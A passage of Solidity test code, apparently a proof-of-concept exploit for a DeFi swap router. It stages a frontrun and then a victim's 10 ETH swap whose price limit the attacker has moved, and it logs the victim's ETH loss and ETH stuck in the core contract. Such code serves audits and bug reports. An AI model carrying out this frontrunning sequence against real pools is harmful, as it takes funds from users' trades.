BalanceAfterFrontrun = token1.balanceOf(ATTACKER);\n        uint256 attackerToken1ReceivedAfterFrontrun = attackerToken1BalanceAfterFrontrun - attackerToken1BalanceBeforeFrontrun;\n        console.log(\"Attacker Token1 received:\", attackerToken1ReceivedAfterFrontrun);\n        \n        // VICTIM'S TX EXECUTES\n        console.log(\"\\n  --- Victim's Transaction ---\");\n\n        // Record balances\n        uint256 coreETHBalanceBefore = address(core).balance;\n        uint256 victimETHBalanceBefore = VICTIM.balance;\n        uint256 victimToken1BalanceBefore = token1.balanceOf(VICTIM);\n\n        uint256 victimSwapAmount = 10 ether;\n        \n        vm.prank(VICTIM);\n        PoolBalanceUpdate victimUpdate = router.swap{value: victimSwapAmount}(\n            ethPoolKey,\n            false,          // isToken1 = false (selling ETH)\n            int128(int256(victimSwapAmount)),\n            victimLimit,    // Same limit - now equals current price!\n            0,\n            type(int256).min,\n            VICTIM\n        );\n        \n        console.log(\"Victim swap delta0:\", victimUpdate.delta0());\n        console.log(\"Victim swap delta1:\", victimUpdate.delta1());\n\n        PoolState stateAfterVictimSwap = core.poolState(poolId);\n        int32 tickAfterVictimSwap = stateAfterVictimSwap.tick();\n        console.log(\"\\n  Pool tick after victim swap:\", tickAfterVictimSwap);\n\n        // Results\n        uint256 coreETHBalanceAfter = address(core).balance;\n        uint256 victimETHBalanceAfter = VICTIM.balance;\n        uint256 victimToken1BalanceAfter = token1.balanceOf(VICTIM);\n        \n        uint256 ethStuckInCore = coreETHBalanceAfter - coreETHBalanceBefore;\n        uint256 victimETHLoss = victimETHBalanceBefore - victimETHBalanceAfter;\n        uint256 victimToken1Received = victimToken1BalanceAfter - victimToken1BalanceBefore;\n\n        console.log(\"\\n  === ATTACK RESULTS ===\");\n        console.log(\"Victim ETH lost:\", victimETHLoss)